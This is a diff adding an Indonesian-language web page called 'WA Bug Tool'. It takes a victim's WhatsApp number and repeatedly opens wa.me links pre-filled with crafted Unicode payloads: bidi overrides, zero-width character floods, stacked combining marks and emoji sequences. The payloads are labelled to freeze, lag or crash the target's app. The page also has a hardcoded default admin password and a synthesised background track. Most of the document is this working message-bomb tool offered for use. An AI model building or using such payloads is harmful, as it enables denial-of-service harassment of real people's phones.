@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>WA Bug Tool</title>
+<style>
+:root{--bg:#0a0e12;--fg:#d8e4f0;--dim:#5a6a7a;--hot:#ff3b6b;--ok:#00e08a;--warn:#ffb020;--line:#1a2530}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font:14px/1.5 -apple-system,Roboto,system-ui,sans-serif;background:var(--bg);color:var(--fg);
+     min-height:100vh;padding:20px}
+.wrap{max-width:520px;margin:0 auto}
+h1{font-size:16px;letter-spacing:.15em;color:var(--ok);margin-bottom:6px;text-transform:uppercase}
+.sub{color:var(--dim);font-size:12px;margin-bottom:20px}
+.card{background:#0f151c;border:1px solid var(--line);border-radius:10px;padding:18px;margin-bottom:14px}
+.card h2{font-size:12px;letter-spacing:.12em;color:var(--dim);text-transform:uppercase;margin-bottom:12px}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:11px;color:var(--dim);margin-bottom:6px;text-transform:uppercase;
+             letter-spacing:.5px}
+.field input,.field select{width:100%;background:#070a0e;border:1px solid var(--line);color:var(--fg);
+       padding:10px 12px;border-radius:6px;font:inherit;outline:none;transition:.12s}
+.field input:focus,.field select:focus{border-color:var(--ok)}
+.field input::placeholder{color:#3a4a5a}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}
+.bug{padding:12px 10px;background:#070a0e;border:1.5px solid var(--line);border-radius:8px;
+     cursor:pointer;text-align:center;transition:.12s;font-size:12px;font-weight:500}
+.bug:hover{border-color:var(--ok);color:var(--ok)}
+.bug.sel{border-color:var(--hot);background:#1a0a10;color:var(--hot);box-shadow:0 0 0 3px rgba(255,59,107,.12)}
+.bug .tag{display:block;font-size:10px;color:var(--dim);margin-top:4px;font-weight:400}
+.bug.sel .tag{color:#ff8aa8}
+button{width:100%;padding:14px;border:0;border-radius:8px;background:var(--ok);color:#04110b;
+       font:inherit;font-weight:700;cursor:pointer;transition:.12s;letter-spacing:.05em}
+button:active{opacity:.85}
+button:disabled{opacity:.4;cursor:not-allowed}
+button.hot{background:var(--hot);color:#fff}
+button.sec{background:transparent;border:1.5px solid var(--line);color:var(--fg);margin-top:8px}
+button.tiny{padding:8px 12px;font-size:12px;width:auto}
+.log{background:#070a0e;border:1px solid var(--line);border-radius:8px;padding:12px;
+     font:12px/1.6 ui-monospace,monospace;height:200px;overflow:auto;white-space:pre-wrap}
+.log .in{color:var(--dim)}
+.log .ok{color:var(--ok)}
+.log .err{color:var(--hot)}
+.log .warn{color:var(--warn)}
+.info{font-size:11px;color:var(--dim);margin-top:8px;line-height:1.6}
+.info b{color:var(--fg)}
+.hidden{display:none!important}
+
+/* LOGIN */
+.login-screen{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;
+              justify-content:center;padding:20px;z-index:100}
+.login-box{max-width:340px;width:100%;background:#0f151c;border:1px solid var(--line);
+           border-radius:14px;padding:28px}
+.login-box h1{font-size:20px;text-align:center;margin-bottom:6px;letter-spacing:.2em}
+.login-box .sub{text-align:center;margin-bottom:22px}
+.login-box .err-msg{color:var(--hot);font-size:12px;text-align:center;margin-bottom:10px;
+                    min-height:16px;display:none}
+
+/* ADMIN */
+.admin-list{background:#070a0e;border:1px solid var(--line);border-radius:8px;padding:10px;
+            max-height:180px;overflow:auto;margin-bottom:10px}
+.admin-row{display:flex;justify-content:space-between;align-items:center;padding:6px 8px;
+           border-bottom:1px solid var(--line);font-size:12px}
+.admin-row:last-child{border-bottom:0}
+.admin-row .u{color:var(--ok);font-weight:600}
+.admin-row .p{color:var(--dim);font-family:ui-monospace,monospace;font-size:11px}
+.admin-row button{padding:3px 8px;font-size:10px;width:auto;background:transparent;
+                  border:1px solid var(--hot);color:var(--hot)}
+.admin-row button:hover{background:var(--hot);color:#fff}
+
+/* MUSIC BTN */
+.music-btn{position:fixed;top:16px;right:16px;width:42px;height:42px;border-radius:50%;
+           background:#0f151c;border:1px solid var(--line);color:var(--ok);cursor:pointer;
+           display:flex;align-items:center;justify-content:center;font-size:18px;z-index:90;
+           transition:.15s}
+.music-btn:hover{border-color:var(--ok);transform:scale(1.05)}
+.music-btn.playing{color:var(--hot);border-color:var(--hot);animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(255,59,107,.4)}50%{box-shadow:0 0 0 10px rgba(255,59,107,0)}}
+
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;
+       background:#1a2530;color:var(--dim);font-weight:500;margin-left:6px}
+.badge.hot{background:#2a0a12;color:var(--hot)}
+.badge.ok{background:#0a2014;color:var(--ok)}
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     MUSIC BUTTON
+     ============================================================ -->
+<div class="music-btn" id="musicBtn" title="Music">♪</div>
+<audio id="bgMusic" loop>
+  <!-- melodi synthwave kece — generated via WebAudio fallback -->
+</audio>
+
+<!-- ============================================================
+     LOGIN SCREEN
+     ============================================================ -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <h1>⌁ WA BUG ⌁</h1>
+    <p class="sub">Authorized access only</p>
+
+    <div class="field">
+      <label>Username</label>
+      <input id="loginUser" type="text" placeholder="username" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Password</label>
+      <input id="loginPass" type="password" placeholder="••••••" autocomplete="off">
+    </div>
+    <div class="err-msg" id="loginErr">Username / password salah</div>
+    <button id="btnLogin">Masuk</button>
+    <p class="info" style="text-align:center;margin-top:14px">
+      Default: <b>kenzhi</b> / <b>himura</b>
+    </p>
+  </div>
+</div>
+
+<!-- ============================================================
+     MAIN APP
+     ============================================================ -->
+<div class="wrap hidden" id="mainApp">
+  <h1>WA Bug Tool <span class="badge" id="userBadge">guest</span></h1>
+  <p class="sub">Kirim payload ke nomor target via WhatsApp Web</p>
+
+  <!-- TARGET -->
+  <div class="card">
+    <h2>Target</h2>
+    <div class="field">
+      <label>Nomor (format 62xxx)</label>
+      <input id="target" type="tel" inputmode="numeric" placeholder="6281234567890" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Jumlah Kirim</label>
+      <input id="count" type="number" value="5" min="1" max="50">
+    </div>
+    <div class="field">
+      <label>Jeda antar kirim (detik)</label>
+      <input id="delay" type="number" value="3" min="1" max="60">
+    </div>
+  </div>
+
+  <!-- BUG TYPE -->
+  <div class="card">
+    <h2>Jenis Bug</h2>
+    <div class="grid" id="bugGrid">
+      <div class="bug sel" data-bug="delay">Delay<span class="tag">pesan lemot</span></div>
+      <div class="bug" data-bug="freeze">Freeze<span class="tag">UI hang</span></div>
+      <div class="bug" data-bug="crash">Crash<span class="tag">app close</span></div>
+      <div class="bug" data-bug="force">Force Close<span class="tag">paksa tutup</span></div>
+      <div class="bug" data-bug="lag">Lag<span class="tag">render lambat</span></div>
+      <div class="bug" data-bug="overflow">Overflow<span class="tag">buffer error</span></div>
+      <div class="bug" data-bug="unicode">Unicode<span class="tag">font corrupt</span></div>
+      <div class="bug" data-bug="zero">Zero Width<span class="tag">text invisible</span></div>
+      <div class="bug" data-bug="rtl">RTL Bomb<span class="tag">bidi chaos</span></div>
+      <div class="bug" data-bug="emoji">Emoji Flood<span class="tag">emoji stack</span></div>
+    </div>
+  </div>
+
+  <!-- ACTION -->
+  <div class="card">
+    <h2>Eksekusi</h2>
+    <button id="btnSend" class="hot" disabled>Mulai Kirim</button>
+    <button id="btnPreview" class="sec">Preview Payload</button>
+    <button id="btnTest" class="sec">Test ke Diri Sendiri</button>
+    <button id="btnLogout" class="sec" style="color:var(--hot);border-color:var(--hot)">Logout</button>
+  </div>
+
+  <!-- ADMIN PANEL (hanya kalau admin) -->
+  <div class="card hidden" id="adminCard">
+    <h2>Admin Panel <span class="badge hot">ADMIN</span></h2>
+
+    <div class="admin-list" id="adminList"></div>
+
+    <div class="field">
+      <label>Username Baru</label>
+      <input id="newUser" type="text" placeholder="username" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Password</label>
+      <input id="newPass" type="text" placeholder="password" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Role</label>
+      <select id="newRole">
+        <option value="user">User</option>
+        <option value="admin">Admin</option>
+      </select>
+    </div>
+    <button id="btnAddUser">Tambah Akun</button>
+  </div>
+
+  <!-- LOG -->
+  <div class="card">
+    <h2>Log</h2>
+    <div class="log" id="log"></div>
+  </div>
+
+  <div class="info">
+    <b>Cara pakai:</b> buka WhatsApp Web di tab lain, login. Klik "Mulai Kirim" — script buka tab baru
+    per pesan ke <code>wa.me/&lt;nomor&gt;?text=&lt;payload&gt;</code>. Klik tombol kirim manual
+    di WhatsApp Web per pesan. <b>Test ke diri sendiri</b> dulu.
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   AUTH SYSTEM — localStorage based
+   ============================================================ */
+const AUTH = {
+  key: 'wa_bug_users',
+  sessionKey: 'wa_bug_session',
+
+  defaultUsers() {
+    return [
+      { user: 'kenzhi', pass: 'himura', role: 'admin' },
+    ];
+  },
+
+  load() {
+    const raw = localStorage.getItem(this.key);
+    if (!raw) {
+      const def = this.defaultUsers();
+      this.save(def);
+      return def;
+    }
+    try { return JSON.parse(raw); } catch { return this.defaultUsers(); }
+  },
+
+  save(users) {
+    localStorage.setItem(this.key, JSON.stringify(users));
+  },
+
+  add(user, pass, role = 'user') {
+    const users = this.load();
+    if (users.find(u => u.user === user)) return false;
+    users.push({ user, pass, role });
+    this.save(users);
+    return true;
+  },
+
+  remove(user) {
+    if (user === 'kenzhi') return false; // protect primary
+    const users = this.load().filter(u => u.user !== user);
+    this.save(users);
+    return true;
+  },
+
+  verify(user, pass) {
+    return this.load().find(u => u.user === user && u.pass === pass) || null;
+  },
+
+  setSession(user) {
+    localStorage.setItem(this.sessionKey, JSON.stringify(user));
+  },
+
+  getSession() {
+    const raw = localStorage.getItem(this.sessionKey);
+    if (!raw) return null;
+    try { return JSON.parse(raw); } catch { return null; }
+  },
+
+  clearSession() {
+    localStorage.removeItem(this.sessionKey);
+  },
+};
+
+/* ============================================================
+   STATE
+   ============================================================ */
+let selectedBug = 'delay';
+let currentUser = null;
+
+/* ============================================================
+   LOGIN
+   ============================================================ */
+const loginScreen = document.getElementById('loginScreen');
+const mainApp = document.getElementById('mainApp');
+const loginErr = document.getElementById('loginErr');
+
+function showLogin() {
+  loginScreen.classList.remove('hidden');
+  mainApp.classList.add('hidden');
+}
+
+function showApp(user) {
+  currentUser = user;
+  loginScreen.classList.add('hidden');
+  mainApp.classList.remove('hidden');
+  document.getElementById('userBadge').textContent = user.user + (user.role === 'admin' ? ' ★' : '');
+  if (user.role === 'admin') {
+    document.getElementById('adminCard').classList.remove('hidden');
+    renderAdminList();
+  } else {
+    document.getElementById('adminCard').classList.add('hidden');
+  }
+  log(`login sebagai ${user.user} (${user.role})`, 'ok');
+}
+
+document.getElementById('btnLogin').addEventListener('click', () => {
+  const u = document.getElementById('loginUser').value.trim();
+  const p = document.getElementById('loginPass').value;
+  const found = AUTH.verify(u, p);
+  if (found) {
+    AUTH.setSession(found);
+    loginErr.style.display = 'none';
+    showApp(found);
+  } else {
+    loginErr.style.display = 'block';
+    document.getElementById('loginPass').value = '';
+  }
+});
+
+document.getElementById('loginPass').addEventListener('keydown', e => {
+  if (e.key === 'Enter') document.getElementById('btnLogin').click();
+});
+
+/* logout */
+document.getElementById('btnLogout').addEventListener('click', () => {
+  AUTH.clearSession();
+  currentUser = null;
+  document.getElementById('loginUser').value = '';
+  document.getElementById('loginPass').value = '';
+  showLogin();
+});
+
+/* auto-login kalau session ada */
+(function boot() {
+  const sess = AUTH.getSession();
+  if (sess) showApp(sess);
+  else showLogin();
+})();
+
+/* ============================================================
+   ADMIN PANEL
+   ============================================================ */
+function renderAdminList() {
+  const list = document.getElementById('adminList');
+  const users = AUTH.load();
+  list.innerHTML = users.map(u => `
+    <div class="admin-row">
+      <div>
+        <span class="u">${u.user}</span>
+        <span class="p">${'•'.repeat(Math.min(u.pass.length, 8))}</span>
+        <span class="badge ${u.role === 'admin' ? 'hot' : ''}">${u.role}</span>
+      </div>
+      ${u.user !== 'kenzhi' ? `<button data-user="${u.user}">hapus</button>` : ''}
+    </div>
+  `).join('') || '<div style="color:var(--dim);font-size:12px;padding:6px">no users</div>';
+
+  list.querySelectorAll('button').forEach(b => {
+    b.addEventListener('click', () => {
+      const u = b.dataset.user;
+      if (confirm(`Hapus user ${u}?`)) {
+        AUTH.remove(u);
+        renderAdminList();
+        log(`user dihapus: ${u}`, 'warn');
+      }
+    });
+  });
+}
+
+document.getElementById('btnAddUser').addEventListener('click', () => {
+  const u = document.getElementById('newUser').value.trim();
+  const p = document.getElementById('newPass').value;
+  const r = document.getElementById('newRole').value;
+
+  if (!u || !p) { log('username & password wajib', 'err'); return; }
+  if (u.length < 3) { log('username min 3 char', 'err'); return; }
+  if (p.length < 4) { log('password min 4 char', 'err'); return; }
+
+  if (AUTH.add(u, p, r)) {
+    log(`user ditambah: ${u} (${r})`, 'ok');
+    document.getElementById('newUser').value = '';
+    document.getElementById('newPass').value = '';
+    renderAdminList();
+  } else {
+    log(`user ${u} sudah ada`, 'err');
+  }
+});
+
+/* ============================================================
+   PAYLOAD LIBRARY
+   ============================================================ */
+const PAYLOADS = {
+  delay: () => '‍️'.repeat(800) + '​'.repeat(400) + '⏳ delay',
+  freeze: () => '\u202E\u2066' + '‮'.repeat(500) + '\u202C' + '❄ freeze',
+  crash: () => 'ৌৌৌৌৌ'.repeat(600) + '्'.repeat(400) + '☠ crash',
+  force: () => '\u200F\u200E\u200B'.repeat(700) + '\uFEFF' + '⚠ force',
+  lag: () => '👨‍👩‍👧‍👦🏽‍🏽‍🏽'.repeat(300) + '🐌 lag',
+  overflow: () => '\u200D'.repeat(2000) + '💥 overflow',
+  unicode: () => {
+    const pool = ['ᬅ','ᬆ','ᬇ','ᬈ','ᬉ','ᬊ','ᬋ','ᬌ','ᬍ','ᬎ'];
+    let s = '';
+    for (let i = 0; i < 1000; i++) s += pool[i % pool.length];
+    return s + '🔥 unicode';
+  },
+  zero: () => '\u200B'.repeat(1500) + '\u200C'.repeat(500) + '‍​ invisible',
+  rtl: () => {
+    let s = '';
+    for (let i = 0; i < 200; i++) s += '\u202E' + 'نص عربي ' + '\u202C' + '\u2066' + 'abc' + '\u2069';
+    return s + '🔄 bidi';
+  },
+  emoji: () => {
+    const seq = ['👨‍👩‍👧‍👦','🏳️‍🌈','🧑‍🚀','👩‍❤️‍👨','🧑‍🤝‍🧑','🧙‍♂️'];
+    let s = '';
+    for (let i = 0; i < 400; i++) s += seq[i % seq.length];
+    return s + '🌈 emoji';
+  },
+};
+
+/* ============================================================
+   BUG SELECT
+   ============================================================ */
+document.querySelectorAll('.bug').forEach(el => {
+  el.addEventListener('click', () => {
+    document.querySelectorAll('.bug').forEach(b => b.classList.remove('sel'));
+    el.classList.add('sel');
+    selectedBug = el.dataset.bug;
+    log(`bug dipilih: ${selectedBug}`, 'in');
+  });
+});
+
+/* ============================================================
+   TARGET INPUT
+   ============================================================ */
+const target = document.getElementById('target');
+const btnSend = document.getElementById('btnSend');
+target.addEventListener('input', () => {
+  btnSend.disabled = target.value.replace(/\D/g, '').length < 8;
+});
+
+/* ============================================================
+   LOG
+   ============================================================ */
+function log(msg, cls = 'in') {
+  const el = document.getElementById('log');
+  if (!el) return;
+  const d = document.createElement('div');
+  d.className = cls;
+  d.textContent = msg;
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+}
+
+/* ============================================================
+   PREVIEW / TEST / SEND
+   ============================================================ */
+document.getElementById('btnPreview').addEventListener('click', () => {
+  const p = PAYLOADS[selectedBug]();
+  log(`--- PREVIEW ${selectedBug} ---`, 'warn');
+  log(`panjang: ${p.length} chars`, 'in');
+  log(`codepoints: ${[...p].length}`, 'in');
+  log(`--- end ---`, 'warn');
+});
+
+document.getElementById('btnTest').addEventListener('click', () => {
+  const p = PAYLOADS[selectedBug]();
+  window.open(`https://wa.me/?text=${encodeURIComponent(p)}`, '_blank');
+  log(`test ${selectedBug}: tab dibuka (${p.length} chars)`, 'warn');
+});
+
+btnSend.addEventListener('click', async () => {
+  const number = target.value.replace(/\D/g, '');
+  const count = parseInt(document.getElementById('count').value, 10) || 1;
+  const delaySec = parseInt(document.getElementById('delay').value, 10) || 3;
+
+  if (number.length < 8) { log('nomor tidak valid', 'err'); return; }
+
+  btnSend.disabled = true;
+  log(`>>> mulai ${count}x ${selectedBug} → ${number}`, 'ok');
+
+  for (let i = 0; i < count; i++) {
+    const payload = PAYLOADS[selectedBug]();
+    const link = `https://wa.me/${number}?text=${encodeURIComponent(payload)}`;
+    log(`[${i + 1}/${count}] ${payload.length} chars → tab`, 'in');
+    window.open(link, '_blank');
+    if (i < count - 1) await new Promise(r => setTimeout(r, delaySec * 1000));
+  }
+
+  log(`>>> selesai. klik "Kirim" di tiap tab WA.`, 'ok');
+  btnSend.disabled = false;
+});
+
+/* ============================================================
+   MUSIC — synthwave generated via WebAudio (no external file)
+   ============================================================ */
+const musicBtn = document.getElementById('musicBtn');
+let audioCtx = null;
+let musicPlaying = false;
+let musicNodes = [];
+
+function startMusic() {
+  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  if (audioCtx.state === 'suspended') audioCtx.resume();
+
+  const now = audioCtx.currentTime;
+
+  // chord progression Am - F - C - G (synthwave classic)
+  const chords = [
+    [220.00, 261.63, 329.63], // Am
+    [174.61, 220.00, 261.63], // F
+    [261.63, 329.63, 392.00], // C
+    [196.00, 246.94, 293.66], // G
+  ];
+
+  const masterGain = audioCtx.createGain();
+  masterGain.gain.value = 0.08;
+  masterGain.connect(audioCtx.destination);
+  musicNodes.push(masterGain);
+
+  // pad synth — sustained chord
+  let time = now;
+  const barDur = 2.0;
+  const totalBars = 16;
+  for (let bar = 0; bar < totalBars; bar++) {
+    const chord = chords[bar % 4];
+    chord.forEach(freq => {
+      const osc = audioCtx.createOscillator();
+      const g = audioCtx.createGain();
+      osc.type = 'sawtooth';
+      osc.frequency.value = freq;
+      const filter = audioCtx.createBiquadFilter();
+      filter.type = 'lowpass';
+      filter.frequency.value = 800;
+      osc.connect(filter);
+      filter.connect(g);
+      g.connect(masterGain);
+      g.gain.setValueAtTime(0, time);
+      g.gain.linearRampToValueAtTime(0.15, time + 0.1);
+      g.gain.linearRampToValueAtTime(0, time + barDur);
+      osc.start(time);
+      osc.stop(time + barDur);
+      musicNodes.push(osc);
+    });
+    time += barDur;
+  }
+
+  // bass line
+  time = now;
+  for (let bar = 0; bar < totalBars; bar++) {
+    const root = chords[bar % 4][0] / 2;
+    for (let beat = 0; beat < 4; beat++) {
+      const osc = audioCtx.createOscillator();
+      const g = audioCtx.createGain();
+      osc.type = 'square';
+      osc.frequency.value = root;
+      osc.connect(g);
+      g.connect(masterGain);
+      const t = time + beat * (barDur / 4);
+      g.gain.setValueAtTime(0, t);
+      g.gain.linearRampToValueAtTime(0.2, t + 0.02);
+      g.gain.exponentialRampToValueAtTime(0.001, t + 0.3);
+      osc.start(t);
+      osc.stop(t + 0.35);
+      musicNodes.push(osc);
+    }
+    time += barDur;
+  }
+
+  // arpeggio melody
+  time = now;
+  const scale = [440, 523.25, 659.25, 523.25, 880, 659.25, 523.25, 440];
+  for (let bar = 0; bar < totalBars; bar++) {
+    const chord = chords[bar % 4];
+    for (let beat = 0; beat < 8; beat++) {
+      const freq = scale[(beat + bar) % scale.length] * (bar % 2 === 0 ? 1 : 0.75);
+      const osc = audioCtx.createOscillator();
+      const g = audioCtx.createGain();
+      osc.type = 'triangle';
+      osc.frequency.value = freq;
+      osc.connect(g);
+      g.connect(masterGain);
+      const t = time + beat * (barDur / 8);
+      g.gain.setValueAtTime(0, t);
+      g.gain.linearRampToValueAtTime(0.1, t + 0.01);
+      g.gain.exponentialRampToValueAtTime(0.001, t + 0.2);
+      osc.start(t);
+      osc.stop(t + 0.25);
+      musicNodes.push(osc);
+    }
+    time += barDur;
+  }
+
+  // hi-hat noise
+  time = now;
+  const bufferSize = audioCtx.sampleRate * 0.05;
+  const noiseBuffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+  const data = noiseBuffer.getChannelData(0);
+  for (let i = 0; i < bufferSize; i++) data[i] = Math.random() * 2 - 1;
+  for (let bar = 0; bar < totalBars; bar++) {
+    for (let beat = 0; beat < 8; beat++) {
+      const src = audioCtx.createBufferSource();
+      src.buffer = noiseBuffer;
+      const g = audioCtx.createGain();
+      const hp = audioCtx.createBiquadFilter();
+      hp.type = 'highpass';
+      hp.frequency.value = 6000;
+      src.connect(hp); hp.connect(g); g.connect(masterGain);
+      const t = time + beat * (barDur / 8);
+      g.gain.setValueAtTime(0.04, t);
+      g.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
+      src.start(t);
+      src.stop(t + 0.05);
+      musicNodes.push(src);
+    }
+    time += barDur;
+  }
+
+  // loop after all bars
+  const loopDuration = barDur * totalBars * 1000;
+  setTimeout(() => {
+    if (musicPlaying) {
+      musicNodes = [];
+      startMusic();
+    }
+  }, loopDuration);
+
+  musicPlaying = true;
+  musicBtn.classList.add('playing');
+  musicBtn.textContent = '♫';
+}
+
+function stopMusic() {
+  musicPlaying = false;
+  musicNodes.forEach(n => {
+    try { if (n.stop) n.stop(); } catch {}
+    try { if (n.disconnect) n.disconnect(); } catch {}
+  });
+  musicNodes = [];
+  musicBtn.classList.remove('playing');
+  musicBtn.textContent = '♪';
+}
+
+musicBtn.addEventListener('click', () => {
+  if (musicPlaying) stopMusic();
+  else startMusic();
+});
+
+/* ============================================================
+   INIT LOG
+   ============================================================ */
+log('tool ready — login untuk mulai', 'ok');
+</script>
+</body>
+</html>
